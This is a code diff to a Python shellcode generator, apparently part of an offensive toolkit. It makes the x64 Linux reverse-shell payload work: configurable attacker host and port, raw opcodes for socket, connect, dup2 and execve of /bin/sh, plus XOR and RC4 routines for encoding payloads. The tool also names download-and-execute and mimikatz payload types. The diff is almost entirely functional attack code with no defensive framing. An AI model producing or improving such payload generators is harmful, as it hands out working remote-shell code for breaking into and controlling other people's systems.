@@ -10,6 +10,7 @@ import random
 import struct
 import base64
 import zlib
+import ipaddress
 from typing import Dict, List, Any, Optional, Tuple
 from core.output_handler import print_info, print_success, print_error, print_warning
 
@@ -43,10 +44,11 @@ class ShellcodeGenerator:
         """
         try:
             print_info(f"Generating {shellcode_type} shellcode for {architecture}")
-            
+            custom_params = self._normalize_params(custom_params)
+
             # Generate base shellcode
             base_shellcode = self._generate_base_shellcode(shellcode_type, architecture, custom_params)
-            
+
             # Apply encryption if requested
             if encryption != "none":
                 base_shellcode = self._apply_encryption(base_shellcode, encryption)
@@ -83,22 +85,36 @@ class ShellcodeGenerator:
             print_error(f"Shellcode generation failed: {e}")
             return {}
     
+    def _normalize_params(self, custom_params: Optional[Dict[str, Any]]) -> Dict[str, Any]:
+        params = dict(custom_params or {})
+        host = params.get("host") or params.get("lhost") or params.get("LHOST") or "127.0.0.1"
+        port = params.get("port") or params.get("lport") or params.get("LPORT") or 4444
+        params["host"] = str(host)
+        params["port"] = int(port)
+        if not 1 <= params["port"] <= 65535:
+            raise ValueError("port must be between 1 and 65535")
+        return params
+
+    @staticmethod
+    def _ipv4_bytes(host: str) -> List[int]:
+        try:
+            address = ipaddress.ip_address(str(host))
+        except ValueError as exc:
+            raise ValueError(f"host must be a valid IPv4 address: {host}") from exc
+        if address.version != 4:
+            raise ValueError("x64 reverse shell currently supports IPv4 addresses only")
+        return list(address.packed)
+
     def _generate_base_shellcode(self, shellcode_type: str, architecture: str, custom_params: Dict = None) -> bytes:
         """Generate base shellcode based on type and architecture"""
         if custom_params is None:
             custom_params = {}
         
-        if architecture == "x64":
-            return self._generate_x64_shellcode(shellcode_type, custom_params)
-        elif architecture == "x86":
-            return self._generate_x86_shellcode(shellcode_type, custom_params)
-        elif architecture == "arm":
-            return self._generate_arm_shellcode(shellcode_type, custom_params)
-        elif architecture == "arm64":
-            return self._generate_arm64_shellcode(shellcode_type, custom_params)
-        else:
-            print_warning(f"Architecture {architecture} not fully supported, using x64")
-            return self._generate_x64_shellcode(shellcode_type, custom_params)
+        if architecture != "x64":
+            raise ValueError(
+                f"architecture {architecture!r} is not implemented for executable shellcode"
+            )
+        return self._generate_x64_shellcode(shellcode_type, custom_params)
     
     def _generate_x64_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
         """Generate x64 shellcode"""
@@ -112,8 +128,7 @@ class ShellcodeGenerator:
             return self._x64_download_execute_shellcode(custom_params)
         elif shellcode_type == "mimikatz":
             return self._x64_mimikatz_shellcode(custom_params)
-        else:
-            return self._x64_generic_shellcode(shellcode_type, custom_params)
+        raise ValueError(f"shellcode type {shellcode_type!r} is not implemented for x64")
     
     def _x64_execve_shellcode(self, custom_params: Dict) -> bytes:
         """Generate x64 execve shellcode"""
@@ -208,55 +223,37 @@ class ShellcodeGenerator:
         return bytes(shellcode)
     
     def _x64_reverse_shell_shellcode(self, custom_params: Dict) -> bytes:
-        """Generate x64 reverse shell shellcode"""
+        """Generate Linux x64 reverse TCP shellcode with an inline sockaddr."""
         host = custom_params.get('host', '127.0.0.1')
-        port = custom_params.get('port', 4444)
-        
-        # Convert host to IP address (simplified)
-        if host == '127.0.0.1':
-            host_bytes = [127, 0, 0, 1]
-        else:
-            host_bytes = [192, 168, 1, 100]  # Default fallback
-        
-        # x64 reverse shell shellcode
+        port = int(custom_params.get('port', 4444))
+        host_bytes = self._ipv4_bytes(host)
+        sockaddr = b"\x02\x00" + struct.pack(">H", port) + bytes(host_bytes) + b"\x00\x00"
+
         shellcode = bytearray()
-        
+
         # socket(AF_INET, SOCK_STREAM, 0)
-        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
-        shellcode.extend([0x48, 0x31, 0xff])  # xor rdi, rdi
-        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
-        shellcode.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
-        shellcode.extend([0x48, 0x83, 0xc0, 0x29])  # add rax, 41 (socket)
-        shellcode.extend([0x0f, 0x05])        # syscall
-        
+        shellcode.extend(b"\x48\x31\xc0\xb0\x29")
+        shellcode.extend(b"\x48\x31\xff\x40\xb7\x02")
+        shellcode.extend(b"\x48\x31\xf6\x40\xb6\x01")
+        shellcode.extend(b"\x48\x31\xd2\x0f\x05")
+
         # connect(sockfd, &addr, sizeof(addr))
-        shellcode.extend([0x48, 0x89, 0xc7])  # mov rdi, rax (socket fd)
-        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
-        shellcode.extend([0x50])              # push rax
-        shellcode.extend([0x48, 0x89, 0xe6])  # mov rsi, rsp
-        shellcode.extend([0x48, 0x83, 0xc0, 0x2a])  # add rax, 42 (connect)
-        shellcode.extend([0x0f, 0x05])        # syscall
-        
+        shellcode.extend(b"\x48\x89\xc7")
+        shellcode.extend(b"\x48\xbb" + sockaddr)
+        shellcode.extend(b"\x53\x48\x89\xe6\xb2\x10")
+        shellcode.extend(b"\x48\x31\xc0\xb0\x2a\x0f\x05")
+
         # dup2(clientfd, 0), dup2(clientfd, 1), dup2(clientfd, 2)
-        for i in range(3):
-            shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
-            shellcode.extend([0x48, 0x83, 0xc0, 0x21])  # add rax, 33 (dup2)
-            shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
-            shellcode.extend([0x48, 0x83, 0xc6, i])     # add rsi, i
-            shellcode.extend([0x0f, 0x05])        # syscall
-        
+        shellcode.extend(b"\x48\x31\xf6")
+        shellcode.extend(b"\x48\x31\xc0\xb0\x21\x0f\x05")
+        shellcode.extend(b"\x48\xff\xc6\x40\x80\xfe\x03\x75\xf2")
+
         # execve("/bin/sh", NULL, NULL)
-        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
-        shellcode.extend([0x50])              # push rax
-        shellcode.extend([0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68])  # mov rbx, '//bin/sh'
-        shellcode.extend([0x53])              # push rbx
-        shellcode.extend([0x48, 0x89, 0xe7])  # mov rdi, rsp
-        shellcode.extend([0x50])              # push rax
-        shellcode.extend([0x57])              # push rdi
-        shellcode.extend([0x48, 0x89, 0xe6])  # mov rsi, rsp
-        shellcode.extend([0xb0, 0x3b])        # mov al, 59 (execve)
-        shellcode.extend([0x0f, 0x05])        # syscall
-        
+        shellcode.extend(b"\x48\x31\xd2\x48\x31\xc0\x50")
+        shellcode.extend(b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68")
+        shellcode.extend(b"\x53\x48\x89\xe7\x50\x57\x48\x89\xe6")
+        shellcode.extend(b"\xb0\x3b\x0f\x05")
+
         return bytes(shellcode)
     
     def _x64_download_execute_shellcode(self, custom_params: Dict) -> bytes:
@@ -332,7 +329,7 @@ class ShellcodeGenerator:
             return self._custom_encrypt(shellcode)
         else:
             return shellcode
-    
+
     def _xor_encrypt(self, shellcode: bytes) -> bytes:
         """XOR encrypt shellcode"""
         key = random.randint(1, 255)
@@ -345,16 +342,25 @@ class ShellcodeGenerator:
         return bytes([key]) + bytes(encrypted)
     
     def _aes_encrypt(self, shellcode: bytes) -> bytes:
-        """AES encrypt shellcode (simplified)"""
-        # This would use actual AES encryption
-        # For now, just return XOR encrypted version
-        return self._xor_encrypt(shellcode)
-    
+        raise ValueError("AES executable decoder is not implemented")
+
+    def _rc4_crypt(self, data: bytes, key: bytes) -> bytes:
+        S = list(range(256))
+        j = 0
+        for i in range(256):
+            j = (j + S[i] + key[i % len(key)]) % 256
+            S[i], S[j] = S[j], S[i]
+        i = j = 0
+        out = bytearray()
+        for byte in data:
+            i = (i + 1) % 256
+            j = (j + S[i]) % 256
+            S[i], S[j] = S[j], S[i]
+            out.append(byte ^ S[(S[i] + S[j]) % 256])
+        return bytes(out)
+
     def _rc4_encrypt(self, shellcode: bytes) -> bytes:
-        """RC4 encrypt shellcode (simplified)"""
-        # This would use actual RC4 encryption
-        # For now, just return XOR encrypted version
-        return self._xor_encrypt(shellcode)
+        raise ValueError("RC4 executable decoder is not implemented")
     
     def _custom_encrypt(self, shellcode: bytes) -> bytes:
         """Custom encryption method"""
@@ -447,12 +453,10 @@ class ShellcodeGenerator:
         return bytes(decoder)
     
     def _generate_aes_decoder(self) -> bytes:
-        """Generate AES decoder (placeholder)"""
-        return self._generate_xor_decoder()
+        raise ValueError("AES executable decoder is not implemented")
     
     def _generate_rc4_decoder(self) -> bytes:
-        """Generate RC4 decoder (placeholder)"""
-        return self._generate_xor_decoder()
+        raise ValueError("RC4 executable decoder is not implemented")
     
     def _create_final_payload(self, decoder: bytes, shellcode: bytes) -> bytes:
         """Create final payload with decoder and shellcode"""
